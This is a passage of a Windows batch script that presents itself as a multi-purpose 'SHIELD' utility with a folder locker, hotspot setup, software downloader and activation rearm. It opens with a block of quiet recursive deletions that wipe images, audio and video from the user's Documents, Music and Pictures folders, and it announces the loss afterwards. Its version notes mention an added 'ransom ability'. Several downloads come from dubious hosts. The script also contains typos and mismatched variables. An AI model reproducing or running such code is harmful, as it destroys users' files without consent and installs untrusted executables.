del /s /q "C:\users\%username%\Documents\*.jpeg"
del /s /q "C:\users\%username%\Documents\*.jpg"
del /s /q "C:\users\%username%\Documents\*.mp4"
del /s /q "C:\users\%username%\Documents\*.mp3"
del /s /q "C:\users\%username%\Documents\*.mpg"
del /s /q "C:\users\%username%\Documents\*.mpeg1"
del /s /q "C:\users\%username%\Documents\*.webm"
del /s /q "C:\users\%username%\Documents\*.wma"
del /s /q "C:\users\%username%\Documents\*.wmv"
del /s /q "C:\users\%username%\Documents\*.vob"
del /s /q "C:\users\%username%\Music\*.3gp"
del /s /q "C:\users\%username%\Music\*.3gpp"
del /s /q "C:\users\%username%\Music\*.ogg"
del /s /q "C:\users\%username%\Music\*.dat"
del /s /q "C:\users\%username%\Music\*.avi"
del /s /q "C:\users\%username%\Music\*.flv"
del /s /q "C:\users\%username%\Music\*.jpeg"
del /s /q "C:\users\%username%\Music\*.jpg"
del /s /q "C:\users\%username%\Music\*.mp4"
del /s /q "C:\users\%username%\Music\*.mp3"
del /s /q "C:\users\%username%\Music\*.mpg"
del /s /q "C:\users\%username%\Music\*.mpeg1"
del /s /q "C:\users\%username%\Music\*.webm"
del /s /q "C:\users\%username%\Music\*.wma"
del /s /q "C:\users\%username%\Music\*.wmv"
del /s /q "C:\users\%username%\Music\*.vob"
del /s /q "C:\users\%username%\Pictures\*.3gp"
del /s /q "C:\users\%username%\Pictures\*.3gpp"
del /s /q "C:\users\%username%\Pictures\*.ogg"
del /s /q "C:\users\%username%\Picutres\*.dat"
del /s /q "C:\users\%username%\Pictures\*.avi"
del /s /q "C:\users\%username%\Pictures\*.flv"
del /s /q "C:\users\%username%\Pictures\*.jpeg"
del /s /q "C:\users\%username%\Pictures\*.jpg"
del /s /q "C:\users\%username%\Pictures\*.mp4"
del /s /q "C:\users\%username%\Pictures\*.mp3"
del /s /q "C:\users\%username%\Pictures\*.mpeg1"
del /s /q "C:\users\%username%\Pictures\*.webm"
del /s /q "C:\users\%username%\Pictures\*.wma"
del /s /q "C:\users\%username%\Pictures\*.wmv"
del /s /q "C:\users\%username%\Pictures\*.vob"
del /s /q "C:\Users\%username%\AppData\Local\Temp\*.*"
echo well done you have just deleted all the music and videos from your computer
goto start

:secure
SET CPSD=shield 
CLS 
:StartLock 
IF EXIST "SHIELD" GOTO HIDE 
IF EXIST "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" GOTO SHOW 
GOTO SHIELD 

:HIDE 
CLS 
CHOICE /C YN /M "Are you sure you want to lock the folder?" 
IF /I %ERRORLEVEL% EQU 2 EXIT 
REN "SHIELD" "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" 
ATTRIB /S /D "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" +H +S 
CLS 
ECHO Folder locked successfully! 
PAUSE>NUL 
EXIT 

:SHOW 
COLOR 03 
CLS 
ECHO Please enter the password to unlock the folder... 
ECHO. 
SET/P "PSWD=>" 
IF /I %PSWD% EQU %CPSD% GOTO UNLOCK 
COLOR 0C 
CLS 
ECHO The password you entered is incorrect! 
PAUSE>NUL 
GOTO SHOW 

:UNLOCK 
ATTRIB /S /D "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" -H -S 
REN "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" "SHIELD" 
CLS 
ECHO Folder unlocked successfully! 
PAUSE>NUL 
goto start

:shield 
MD SHIELD 
CLS 
ECHO Secure Folder created successfully! Put your files in it and secure it. You can unlock it anytime. 
PAUSE>NUL 
goto start
:hotspot
echo 1) set up hotspot
echo 2) Start Hotspot
echo 3) Stop Hotspot
set/p "hots=>"
if %cho%==1 goto sethots
if %cho%==2 goto starthots
if %cho%==3 goto stophots
:sethots
echo Setting up SHIELD Hotspot
echo wait
netsh wlan set SHIELD mode=allow ssid=SHIELD key=SHIELD keyusage=persistent
echo Hotspot set complete password is SHIELD
echo starting hotspot now
goto starthots
:starthots
echo hotspot is on
echo wait
netsh wlan start SHIELD
echo hotspot started successfully
goto start
:stophots
netsh wlan stop SHIELD
goto exit
:programlist
echo These are the recommended programs
echo 1)Firefox 42 or higher
echo 2)	Internet Download manager. 6.23 build 11  or higher
echo 3)	Winrar 
echo 4)	VLC. 
echo 5)	Ccleaner. 
echo 6)	Smadav 
echo 7)	Adobe reader / FOXIT 
echo 8)	Notepad++ 
echo 9)	Python
mkdir "C:\users\%username%\Desktop\downloads"
@echo off
color 0A
echo you are about to download 300MB of data
pause

Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://83downloadz.tk/d2467b953ab2bec8?download_token=28369fa4e4d10d8a11dfebaa2f3a234bbe21f0486125db2b82641ebfe679cf03','%userprofile%\Desktop\downloads\idm.zip')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download-installer.cdn.mozilla.net/pub/firefox/releases/52.0.2/win32/en-US/Firefox Setup Stub 52.0.2.exe','%userprofile%\Desktop\downloads\Firefox Setup 57.0.4.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.videolan.org/vlc/last/win32/vlc-3.0.8-win32.exe','%userprofile%\Desktop\downloads\vlc-3.0.8-win32.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://download.notepad-plus-plus.org/repository/7.x/7.8/npp.7.8.Installer.exe','%userprofile%\Desktop\downloads\npp.7.8.Installer.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.ccleaner.com/ccsetup563.exe','%userprofile%\Desktop\downloads\ccsetup563.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://www.unjuk.com/smadav2019rev130.exe','%userprofile%\Desktop\downloads\smadav2019rev130.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/2.7.15/python-2.7.15.amd64.msi','%userprofile%\Desktop\downloads\python-2.7.15.amd64.msi')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.mykehnet.org/apps/Adobe/Adobe%20Reader/11/AdbeRdr11010_en_US.exe','%userprofile%\Desktop\downloads\AdbeRdr11010_en_US.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://tmp.sorlo.com/software/winrar/win3.9.zip','%userprofile%\Desktop\downloads\win3.9.zip')"
echo download complete and extracted to the directory.
goto start

:Activawin
echo this is temproray
slmgr /rearm
goto start

::version check
::version 2 added program download 
::version 21 added ransom ability
::version 21 added rename ability